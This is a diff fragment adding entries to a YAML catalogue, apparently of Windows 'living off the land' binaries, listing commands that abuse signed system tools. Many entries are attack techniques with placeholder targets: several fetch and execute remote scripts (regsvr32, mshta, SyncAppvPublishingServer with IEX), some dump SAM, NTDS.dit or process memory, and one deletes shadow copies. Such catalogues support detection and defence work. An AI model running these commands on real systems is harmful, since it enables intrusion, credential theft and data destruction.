+  - msbuild.exe {PATH:.csproj}
+  - msbuild.exe /logger:TargetLogger,{PATH_ABSOLUTE:.dll};MyParameters,Foo
+  - msbuild.exe {PATH:.proj}
+  - msbuild.exe @{PATH:.rsp}
+  paths:
+  - '{''Path'': ''C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\Msbuild.exe''}'
+  - '{''Path'': ''C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\Msbuild.exe''}'
+  - '{''Path'': ''C:\\Windows\\Microsoft.NET\\Framework\\v3.5\\Msbuild.exe''}'
+  - '{''Path'': ''C:\\Windows\\Microsoft.NET\\Framework64\\v3.5\\Msbuild.exe''}'
+  - '{''Path'': ''C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Msbuild.exe''}'
+  - '{''Path'': ''C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Msbuild.exe''}'
+  attack: []
+- binary: Msconfig.exe
+  description: MSConfig is a troubleshooting tool which is used to temporarily disable or re-enable software, device drivers or Windows services that run during startup process to help the user determine the cause of a problem with Windows
+  commands:
+  - Msconfig.exe -5
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\msconfig.exe''}'
+  attack: []
+- binary: Msdt.exe
+  description: Microsoft diagnostics tool
+  commands:
+  - msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af {PATH_ABSOLUTE:.xml} /skip TRUE
+  - msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af {PATH_ABSOLUTE:.xml} /skip TRUE
+  - msdt.exe /id PCWDiagnostic /skip force /param "IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe"
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\Msdt.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\Msdt.exe''}'
+  attack: []
+- binary: Msedge.exe
+  description: Microsoft Edge browser
+  commands:
+  - msedge.exe {REMOTEURL:.exe.txt}
+  - msedge.exe --headless --enable-logging --disable-gpu --dump-dom "{REMOTEURL:.base64.html}" > {PATH:.b64}
+  - msedge.exe --disable-gpu-sandbox --gpu-launcher="{CMD} &&"
+  paths:
+  - '{''Path'': ''c:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe''}'
+  - '{''Path'': ''c:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe''}'
+  attack: []
+- binary: Mshta.exe
+  description: Used by Windows to execute html applications. (.hta)
+  commands:
+  - mshta.exe {PATH:.hta}
+  - mshta.exe vbscript:Close(Execute("GetObject(""script:{REMOTEURL:.sct}"")"))
+  - mshta.exe javascript:a=GetObject("script:{REMOTEURL:.sct}").Exec();close();
+  - mshta.exe "{PATH_ABSOLUTE}:file.hta"
+  - mshta.exe {REMOTEURL}
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\mshta.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\mshta.exe''}'
+  attack: []
+- binary: Msiexec.exe
+  description: Used by Windows to execute msi files
+  commands:
+  - msiexec /quiet /i {PATH:.msi}
+  - msiexec /q /i {REMOTEURL}
+  - msiexec /y {PATH_ABSOLUTE:.dll}
+  - msiexec /z {PATH_ABSOLUTE:.dll}
+  - msiexec /i {PATH_ABSOLUTE:.msi} TRANSFORMS="{REMOTEURL:.mst}" /qb
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\msiexec.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\msiexec.exe''}'
+  attack: []
+- binary: msoxmled.exe
+  description: Microsoft Office XML Editor, used to handle XML documents in Microsoft Office.
+  commands:
+  - msoxmled.exe /verb open {REMOTEURL}
+  paths:
+  - '{''Path'': ''C:\\Program Files\\Microsoft Office\\root\\vfs\\ProgramFilesCommonX64\\Microsoft Shared\\Office16\\msoxmled.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\OFFICE14\\msoxmled.exe''}'
+  attack: []
+- binary: Netsh.exe
+  description: Netsh is a Windows tool used to manipulate network interface settings.
+  commands:
+  - netsh.exe add helper {PATH_ABSOLUTE:.dll}
+  paths:
+  - '{''Path'': ''C:\\WINDOWS\\System32\\Netsh.exe''}'
+  - '{''Path'': ''C:\\WINDOWS\\SysWOW64\\Netsh.exe''}'
+  attack: []
+- binary: Ngen.exe
+  description: Microsoft Native Image Generator.
+  commands:
+  - ngen.exe {REMOTEURL}
+  paths:
+  - '{''Path'': ''C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\ngen.exe''}'
+  - '{''Path'': ''C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\ngen.exe''}'
+  - '{''Path'': ''C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\ngen.exe''}'
+  - '{''Path'': ''C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\ngen.exe''}'
+  attack: []
+- binary: Odbcconf.exe
+  description: Used in Windows for managing ODBC connections
+  commands:
+  - odbcconf /a {REGSVR {PATH_ABSOLUTE:.dll}}
+  - 'odbcconf INSTALLDRIVER "lolbas-project|Driver={PATH_ABSOLUTE:.dll}|APILevel=2"
+
+    odbcconf configsysdsn "lolbas-project" "DSN=lolbas-project"'
+  - odbcconf -f {PATH:.rsp}
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\odbcconf.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\odbcconf.exe''}'
+  attack: []
+- binary: OfflineScannerShell.exe
+  description: Windows Defender Offline Shell
+  commands:
+  - OfflineScannerShell
+  paths:
+  - '{''Path'': ''C:\\Program Files\\Windows Defender\\Offline\\OfflineScannerShell.exe''}'
+  attack: []
+- binary: OneDriveStandaloneUpdater.exe
+  description: OneDrive Standalone Updater
+  commands:
+  - OneDriveStandaloneUpdater
+  paths:
+  - '{''Path'': ''C:\\Users\\<username>\\AppData\\Local\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe''}'
+  - '{''Path'': ''C:\\Program Files\\Microsoft OneDrive\\OneDriveStandaloneUpdater.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft OneDrive\\OneDriveStandaloneUpdater.exe''}'
+  attack: []
+- binary: Pcalua.exe
+  description: Program Compatibility Assistant
+  commands:
+  - pcalua.exe -a {PATH:.exe}
+  - pcalua.exe -a {PATH_SMB:.dll}
+  - pcalua.exe -a {PATH_ABSOLUTE:.cpl} -c Java
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\pcalua.exe''}'
+  attack: []
+- binary: Pcwrun.exe
+  description: Program Compatibility Wizard
+  commands:
+  - Pcwrun.exe {PATH_ABSOLUTE:.exe}
+  - Pcwrun.exe /../../$(calc).exe
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\pcwrun.exe''}'
+  attack: []
+- binary: Pktmon.exe
+  description: Capture Network Packets on the windows 10 with October 2018 Update or later.
+  commands:
+  - pktmon.exe start --etw
+  - pktmon.exe filter add -p 445
+  paths:
+  - '{''Path'': ''c:\\windows\\system32\\pktmon.exe''}'
+  - '{''Path'': ''c:\\windows\\syswow64\\pktmon.exe''}'
+  attack: []
+- binary: Pnputil.exe
+  description: Used for installing drivers
+  commands:
+  - pnputil.exe -i -a {PATH_ABSOLUTE:.inf}
+  paths:
+  - '{''Path'': ''C:\\Windows\\system32\\pnputil.exe''}'
+  attack: []
+- binary: Presentationhost.exe
+  description: File is used for executing Browser applications
+  commands:
+  - Presentationhost.exe {PATH_ABSOLUTE:.xbap}
+  - Presentationhost.exe {REMOTEURL}
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\Presentationhost.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\Presentationhost.exe''}'
+  attack: []
+- binary: Print.exe
+  description: Used by Windows to send files to the printer
+  commands:
+  - print /D:{PATH_ABSOLUTE}:file.exe {PATH_ABSOLUTE:.exe}
+  - print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_ABSOLUTE:.source.exe}
+  - print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_SMB:.source.exe}
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\print.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\print.exe''}'
+  attack: []
+- binary: PrintBrm.exe
+  description: Printer Migration Command-Line Tool
+  commands:
+  - PrintBrm -b -d {PATH_SMB:folder} -f {PATH_ABSOLUTE:.zip}
+  - PrintBrm -r -f {PATH_ABSOLUTE}:hidden.zip -d {PATH_ABSOLUTE:folder}
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\spool\\tools\\PrintBrm.exe''}'
+  attack: []
+- binary: Provlaunch.exe
+  description: Launcher process
+  commands:
+  - provlaunch.exe LOLBin
+  paths:
+  - '{''Path'': ''c:\\windows\\system32\\provlaunch.exe''}'
+  attack: []
+- binary: Psr.exe
+  description: Windows Problem Steps Recorder, used to record screen and clicks.
+  commands:
+  - psr.exe /start /output {PATH_ABSOLUTE:.zip} /sc 1 /gui 0
+  paths:
+  - '{''Path'': ''c:\\windows\\system32\\psr.exe''}'
+  - '{''Path'': ''c:\\windows\\syswow64\\psr.exe''}'
+  attack: []
+- binary: Query.exe
+  description: Remote Desktop Services MultiUser Query Utility
+  commands:
+  - query.exe user
+  paths:
+  - '{''Path'': ''c:\\windows\\system32\\query.exe''}'
+  - '{''Path'': ''c:\\windows\\syswow64\\query.exe''}'
+  attack: []
+- binary: Rasautou.exe
+  description: Windows Remote Access Dialer
+  commands:
+  - rasautou -d {PATH:.dll} -p export_name -a a -e e
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\rasautou.exe''}'
+  attack: []
+- binary: rdrleakdiag.exe
+  description: Microsoft Windows resource leak diagnostic tool
+  commands:
+  - rdrleakdiag.exe /p 940 /o {PATH_ABSOLUTE:folder} /fullmemdmp /wait 1
+  - rdrleakdiag.exe /p 832 /o {PATH_ABSOLUTE:folder} /fullmemdmp /wait 1
+  - rdrleakdiag.exe /p 832 /o {PATH_ABSOLUTE:folder} /fullmemdmp /snap
+  paths:
+  - '{''Path'': ''c:\\windows\\system32\\rdrleakdiag.exe''}'
+  - '{''Path'': ''c:\\Windows\\SysWOW64\\rdrleakdiag.exe''}'
+  attack: []
+- binary: Reg.exe
+  description: Used to manipulate the registry
+  commands:
+  - reg export HKLM\SOFTWARE\Microsoft\Evilreg {PATH_ABSOLUTE}:evilreg.reg
+  - reg save HKLM\SECURITY {PATH_ABSOLUTE:.1.bak} && reg save HKLM\SYSTEM {PATH_ABSOLUTE:.2.bak} && reg save HKLM\SAM {PATH_ABSOLUTE:.3.bak}
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\reg.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\reg.exe''}'
+  attack: []
+- binary: Regasm.exe
+  description: Part of .NET
+  commands:
+  - regasm.exe {PATH:.dll}
+  - regasm.exe /U {PATH:.dll}
+  paths:
+  - '{''Path'': ''C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\regasm.exe''}'
+  - '{''Path'': ''C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\regasm.exe''}'
+  - '{''Path'': ''C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe''}'
+  - '{''Path'': ''C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regasm.exe''}'
+  attack: []
+- binary: Regedit.exe
+  description: Used by Windows to manipulate registry
+  commands:
+  - regedit /E {PATH_ABSOLUTE}:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey
+  - regedit {PATH_ABSOLUTE}:regfile.reg
+  paths:
+  - '{''Path'': ''C:\\Windows\\regedit.exe''}'
+  attack: []
+- binary: Regini.exe
+  description: Used to manipulate the registry
+  commands:
+  - regini.exe {PATH}:hidden.ini
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\regini.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\regini.exe''}'
+  attack: []
+- binary: Register-cimprovider.exe
+  description: Used to register new wmi providers
+  commands:
+  - Register-cimprovider -path {PATH_ABSOLUTE:.dll}
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\Register-cimprovider.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\Register-cimprovider.exe''}'
+  attack: []
+- binary: Regsvcs.exe
+  description: Regsvcs and Regasm are Windows command-line utilities that are used to register .NET Component Object Model (COM) assemblies
+  commands:
+  - regsvcs.exe {PATH:.dll}
+  - regsvcs.exe {PATH:.dll}
+  paths:
+  - '{''Path'': ''C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\RegSvcs.exe''}'
+  - '{''Path'': ''C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\RegSvcs.exe''}'
+  - '{''Path'': ''C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\RegSvcs.exe''}'
+  - '{''Path'': ''C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegSvcs.exe''}'
+  attack: []
+- binary: Regsvr32.exe
+  description: Used by Windows to register dlls
+  commands:
+  - regsvr32 /s /n /u /i:{REMOTEURL:.sct} scrobj.dll
+  - regsvr32.exe /s /u /i:{PATH:.sct} scrobj.dll
+  - regsvr32 /s /n /u /i:{REMOTEURL:.sct} scrobj.dll
+  - regsvr32.exe /s /u /i:{PATH:.sct} scrobj.dll
+  - regsvr32.exe /s {PATH:.dll}
+  - regsvr32.exe /u /s {PATH:.dll}
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\regsvr32.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\regsvr32.exe''}'
+  attack: []
+- binary: Replace.exe
+  description: Used to replace file with another file
+  commands:
+  - replace.exe {PATH_ABSOLUTE:.cab} {PATH_ABSOLUTE:folder} /A
+  - replace.exe {PATH_SMB:.exe} {PATH_ABSOLUTE:folder} /A
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\replace.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\replace.exe''}'
+  attack: []
+- binary: Reset.exe
+  description: Remote Desktop Services Reset Utility
+  commands:
+  - reset.exe session
+  paths:
+  - '{''Path'': ''c:\\windows\\system32\\reset.exe''}'
+  - '{''Path'': ''c:\\windows\\syswow64\\reset.exe''}'
+  attack: []
+- binary: Rpcping.exe
+  description: Used to verify rpc connection
+  commands:
+  - rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM
+  - rpcping /s 10.0.0.35 /e 9997 /a connect /u NTLM
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\rpcping.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\rpcping.exe''}'
+  attack: []
+- binary: Rundll32.exe
+  description: Used by Windows to execute dll files
+  commands:
+  - rundll32.exe {PATH},EntryPoint
+  - rundll32.exe {PATH_SMB:.dll},EntryPoint
+  - rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:{REMOTEURL}")
+  - rundll32 "{PATH}:ADSDLL.dll",DllMain
+  - rundll32.exe -sta {CLSID}
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\rundll32.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\rundll32.exe''}'
+  attack: []
+- binary: Runexehelper.exe
+  description: Launcher process
+  commands:
+  - runexehelper.exe {PATH_ABSOLUTE:.exe}
+  paths:
+  - '{''Path'': ''c:\\windows\\system32\\runexehelper.exe''}'
+  attack: []
+- binary: Runonce.exe
+  description: Executes a Run Once Task that has been configured in the registry
+  commands:
+  - Runonce.exe /AlternateShellStartup
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\runonce.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\runonce.exe''}'
+  attack: []
+- binary: Runscripthelper.exe
+  description: Execute target PowerShell script
+  commands:
+  - runscripthelper.exe surfacecheck \\?\{PATH_ABSOLUTE:.txt} {PATH_ABSOLUTE:folder}
+  paths:
+  - '{''Path'': ''C:\\Windows\\WinSxS\\amd64_microsoft-windows-u..ed-telemetry-client_31bf3856ad364e35_10.0.16299.15_none_c2df1bba78111118\\Runscripthelper.exe''}'
+  - '{''Path'': ''C:\\Windows\\WinSxS\\amd64_microsoft-windows-u..ed-telemetry-client_31bf3856ad364e35_10.0.16299.192_none_ad4699b571e00c4a\\Runscripthelper.exe''}'
+  attack: []
+- binary: Sc.exe
+  description: Used by Windows to manage services
+  commands:
+  - sc create evilservice binPath="\"c:\\ADS\\file.txt:cmd.exe\" /c echo works > \"c:\ADS\works.txt\"" DisplayName= "evilservice" start= auto\ & sc start evilservice
+  - sc config {ExistingServiceName} binPath="\"c:\\ADS\\file.txt:cmd.exe\" /c echo works > \"c:\ADS\works.txt\"" & sc start {ExistingServiceName}
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\sc.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\sc.exe''}'
+  attack: []
+- binary: Schtasks.exe
+  description: Schedule periodic tasks
+  commands:
+  - schtasks /create /sc minute /mo 1 /tn "Reverse shell" /tr "{CMD}"
+  - schtasks /create /s targetmachine /tn "MyTask" /tr "{CMD}" /sc daily
+  paths:
+  - '{''Path'': ''c:\\windows\\system32\\schtasks.exe''}'
+  - '{''Path'': ''c:\\windows\\syswow64\\schtasks.exe''}'
+  attack: []
+- binary: scp.exe
+  description: Used for uploading or downloading files over SSH.
+  commands:
+  - scp.exe -o ProxyCommand="{CMD}" . localhost:.
+  - scp.exe -S "{CMD}" . localhost:.
+  - scp -o PKCS11Provider="{PATH_SMB:.dll}" . win@github.com:.
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\OpenSSH\\scp.exe''}'
+  attack: []
+- binary: Scriptrunner.exe
+  description: Execute binary through proxy binary to evade defensive counter measures
+  commands:
+  - Scriptrunner.exe -appvscript {PATH:.exe}
+  - ScriptRunner.exe -appvscript {PATH_SMB:.cmd}
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\scriptrunner.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\scriptrunner.exe''}'
+  attack: []
+- binary: Setres.exe
+  description: Configures display settings
+  commands:
+  - setres.exe -w 800 -h 600
+  paths:
+  - '{''Path'': ''c:\\windows\\system32\\setres.exe''}'
+  attack: []
+- binary: SettingSyncHost.exe
+  description: Host Process for Setting Synchronization
+  commands:
+  - SettingSyncHost -LoadAndRunDiagScript {PATH:.exe}
+  - SettingSyncHost -LoadAndRunDiagScriptNoCab {PATH:.bat}
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\SettingSyncHost.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\SettingSyncHost.exe''}'
+  attack: []
+- binary: Sftp.exe
+  description: sftp.exe is a Windows command-line utility that uses the Secure File Transfer Protocol (SFTP) to securely transfer files between a local machine and a remote server.
+  commands:
+  - sftp -o ProxyCommand="{CMD}" .
+  - sftp -D "{CMD}"
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\OpenSSH\\sftp.exe''}'
+  attack: []
+- binary: Sigverif.exe
+  description: File Signature Verification utility to verify digital signatures of files
+  commands:
+  - sigverif.exe
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\sigverif.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\sigverif.exe''}'
+  attack: []
+- binary: ssh.exe
+  description: Ssh.exe is the OpenSSH compatible client can be used to connect to Windows 10 (build 1809 and later) and Windows Server 2019 devices.
+  commands:
+  - ssh localhost "{CMD}"
+  - ssh -o ProxyCommand="{CMD}" .
+  - ssh -o PKCS11Provider="\\\\127.0.0.1\\Temp\\example.dll" win@github.com
+  paths:
+  - '{''Path'': ''c:\\windows\\system32\\OpenSSH\\ssh.exe''}'
+  attack: []
+- binary: Stordiag.exe
+  description: Storage diagnostic tool
+  commands:
+  - stordiag.exe
+  - stordiag.exe
+  paths:
+  - '{''Path'': ''c:\\windows\\system32\\stordiag.exe''}'
+  - '{''Path'': ''c:\\windows\\syswow64\\stordiag.exe''}'
+  attack: []
+- binary: SyncAppvPublishingServer.exe
+  description: Used by App-v to get App-v server lists
+  commands:
+  - SyncAppvPublishingServer.exe "n;(New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX"
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\SyncAppvPublishingServer.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\SyncAppvPublishingServer.exe''}'
+  attack: []
+- binary: Tar.exe
+  description: Used by Windows to extract and create archives.
+  commands:
+  - tar -cf {PATH}:ads {PATH_ABSOLUTE:folder}
+  - tar -xf {PATH}:ads
+  - tar -xf {PATH_SMB:.tar}
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\tar.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\tar.exe''}'
+  attack: []
+- binary: Ttdinject.exe
+  description: Used by Windows 1809 and newer to Debug Time Travel (Underlying call of tttracer.exe)
+  commands:
+  - TTDInject.exe /ClientParams "7 tmp.run 0 0 0 0 0 0 0 0 0 0" /Launch "{PATH:.exe}"
+  - ttdinject.exe /ClientScenario TTDRecorder /ddload 0 /ClientParams "7 tmp.run 0 0 0 0 0 0 0 0 0 0" /launch "{PATH:.exe}"
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\ttdinject.exe''}'
+  - '{''Path'': ''C:\\Windows\\Syswow64\\ttdinject.exe''}'
+  attack: []
+- binary: Tttracer.exe
+  description: Used by Windows 1809 and newer to Debug Time Travel
+  commands:
+  - tttracer.exe {PATH_ABSOLUTE:.exe}
+  - TTTracer.exe -dumpFull -attach {PID}
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\tttracer.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\tttracer.exe''}'
+  attack: []
+- binary: Unregmp2.exe
+  description: Microsoft Windows Media Player Setup Utility
+  commands:
+  - rmdir %temp%\lolbin /s /q 2>nul & mkdir "%temp%\lolbin\Windows Media Player" & copy C:\Windows\System32\calc.exe "%temp%\lolbin\Windows Media Player\wmpnscfg.exe" >nul && cmd /V /C "set "ProgramW6432=%temp%\lolbin" && unregmp2.exe /HideWMP"
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\unregmp2.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\unregmp2.exe''}'
+  attack: []
+- binary: vbc.exe
+  description: Binary file used for compile vbs code
+  commands:
+  - vbc.exe /target:exe {PATH_ABSOLUTE:.vb}
+  - vbc -reference:Microsoft.VisualBasic.dll {PATH_ABSOLUTE:.vb}
+  paths:
+  - '{''Path'': ''C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\vbc.exe''}'
+  - '{''Path'': ''C:\\Windows\\Microsoft.NET\\Framework\\v3.5\\vbc.exe''}'
+  - '{''Path'': ''C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe''}'
+  - '{''Path'': ''C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\vbc.exe''}'
+  - '{''Path'': ''C:\\Windows\\Microsoft.NET\\Framework64\\v3.5\\vbc.exe''}'
+  - '{''Path'': ''C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\vbc.exe''}'
+  attack: []
+- binary: Verclsid.exe
+  description: Used to verify a COM object before it is instantiated by Windows Explorer
+  commands:
+  - verclsid.exe /S /C {CLSID}
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\verclsid.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\verclsid.exe''}'
+  attack: []
+- binary: Vssadmin.exe
+  description: Volume Shadow Copy Service administrative command-line tool
+  commands:
+  - vssadmin delete shadows /all /quiet
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\vssadmin.exe''}'
+  attack: []
+- binary: Wab.exe
+  description: Windows address book manager
+  commands:
+  - wab.exe
+  paths:
+  - '{''Path'': ''C:\\Program Files\\Windows Mail\\wab.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Windows Mail\\wab.exe''}'
+  attack: []
+- binary: wbadmin.exe
+  description: Windows Backup Administration utility
+  commands:
+  - wbadmin start backup -backupTarget:{PATH_ABSOLUTE:folder} -include:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM -quiet
+  - wbadmin start recovery -version:<VERSIONIDENTIFIER> -recoverytarget:{PATH_ABSOLUTE:folder} -itemtype:file -items:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM -notRestoreAcl -quiet
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\wbadmin.exe''}'
+  attack: []
+- binary: wbemtest.exe
+  description: WMI/WBEM Test Binary
+  commands:
+  - wbemtest.exe
+  paths:
+  - '{''Path'': ''c:\\windows\\system32\\wbem\\wbemtest.exe''}'
+  attack: []
+- binary: winget.exe
+  description: Windows Package Manager tool
+  commands:
+  - winget.exe install --manifest {PATH:.yml}
+  - winget.exe install --accept-package-agreements -s msstore {name or ID}
+  - winget.exe install --accept-package-agreements -s msstore {name or ID}
+  paths:
+  - '{''Path'': ''C:\\Users\\user\\AppData\\Local\\Microsoft\\WindowsApps\\winget.exe''}'
+  attack: []
+- binary: Wlrmdr.exe
+  description: Windows Logon Reminder executable
+  commands:
+  - wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u {PATH:.exe}
+  paths:
+  - '{''Path'': ''c:\\windows\\system32\\wlrmdr.exe''}'
+  attack: []
+- binary: Wmic.exe
+  description: The WMI command-line (WMIC) utility provides a command-line interface for WMI
+  commands:
+  - wmic.exe process call create "{PATH_ABSOLUTE}:program.exe"
+  - wmic.exe process call create "{CMD}"
+  - wmic.exe /node:"192.168.0.1" process call create "{CMD}"
+  - wmic.exe process get brief /format:"{REMOTEURL:.xsl}"
+  - wmic.exe process get brief /format:"{PATH_SMB:.xsl}"
+  - wmic.exe datafile where "Name='C:\\windows\\system32\\calc.exe'" call Copy "C:\\users\\public\\calc.exe"
+  - WMIC.exe /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName,productState
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\wbem\\wmic.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\wbem\\wmic.exe''}'
+  attack: []
+- binary: WorkFolders.exe
+  description: Work Folders
+  commands:
+  - WorkFolders
+  - WorkFolders
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\WorkFolders.exe''}'
+  attack: []
+- binary: Wscript.exe
+  description: Used by Windows to execute scripts
+  commands:
+  - wscript //e:vbscript {PATH}:script.vbs
+  - echo GetObject("script:{REMOTEURL:.js}") > {PATH_ABSOLUTE}:hi.js && wscript.exe {PATH_ABSOLUTE}:hi.js
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\wscript.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\wscript.exe''}'
+  attack: []
+- binary: Wsreset.exe
+  description: Used to reset Windows Store settings according to its manifest file
+  commands:
+  - wsreset.exe
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\wsreset.exe''}'
+  attack: []
+- binary: wuauclt.exe
+  description: Windows Update Client
+  commands:
+  - wuauclt.exe /UpdateDeploymentProvider {PATH_ABSOLUTE:.dll} /RunHandlerComServer
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\wuauclt.exe''}'
+  - '{''Path'': ''C:\\Windows\\UUS\\amd64\\wuauclt.exe''}'
+  attack: []
+- binary: Xwizard.exe
+  description: Execute custom class that has been added to the registry or download a file with Xwizard.exe
+  commands:
+  - xwizard RunWizard {00000001-0000-0000-0000-0000FEEDACDC}
+  - xwizard RunWizard /taero /u {00000001-0000-0000-0000-0000FEEDACDC}
+  - xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /z{REMOTEURL}
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\xwizard.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\xwizard.exe''}'
+  attack: []
+- binary: msedge_proxy.exe
+  description: Microsoft Edge Browser
+  commands:
+  - C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe {REMOTEURL:.zip}
+  - C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe --disable-gpu-sandbox --gpu-launcher="{CMD} &&"
+  paths:
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge_proxy.exe''}'
+  attack: []
+- binary: msedgewebview2.exe
+  description: msedgewebview2.exe is the executable file for Microsoft Edge WebView2, which is a web browser control used by applications to display web content.
+  commands:
+  - msedgewebview2.exe --no-sandbox --browser-subprocess-path="{PATH_ABSOLUTE:.exe}"
+  - msedgewebview2.exe --utility-cmd-prefix="{CMD}"
+  - msedgewebview2.exe --disable-gpu-sandbox --gpu-launcher="{CMD}"
+  - msedgewebview2.exe --no-sandbox --renderer-cmd-prefix="{CMD}"
+  paths:
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\114.0.1823.43\\msedgewebview2.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft\\EdgeWebView\\Application\\131.0.2903.70\\msedgewebview2.exe''}'
+  attack: []
+- binary: odbcad32.exe
+  description: ODBC Data Source Administrator to manage User/System DSNs and ODBC drivers.
+  commands:
+  - odbcad32.exe
+  paths:
+  - '{''Path'': ''c:\\windows\\system32\\odbcad32.exe''}'
+  - '{''Path'': ''c:\\windows\\syswow64\\odbcad32.exe''}'
+  attack: []
+- binary: setupugc.exe
